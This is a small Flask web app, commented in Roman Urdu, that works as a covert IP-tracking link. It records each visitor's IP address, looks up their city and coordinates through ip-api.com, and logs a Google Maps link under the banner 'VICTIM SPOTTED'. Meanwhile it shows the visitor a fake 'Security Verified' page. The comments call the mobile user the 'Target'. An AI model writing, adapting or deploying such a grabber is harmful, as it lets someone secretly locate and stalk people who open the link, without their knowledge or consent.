from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # Browser ko cache karne se rokne ke liye headers
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # Target (Mobile user) ka data nikalna
    try:
        # Reliable API
        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
        city = res.get('city', 'Karachi')
        lat = res.get('lat', '24.8607')
        lon = res.get('lon', '67.0011')
        
        # Exact Map Link
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
    except:
        city, map_link = "Locating...", "Retry Link"

    # Ye logs mein 100% nazar aayega
    print(f"\n--- [!!!] VICTIM SPOTTED [!!!] ---")
    print(f"IP: {user_ip} | City: {city}")
    print(f"Location: {map_link}\n")
    
    return f"<h2>Security Verified</h2><p>Device: {user_ip}</p>"
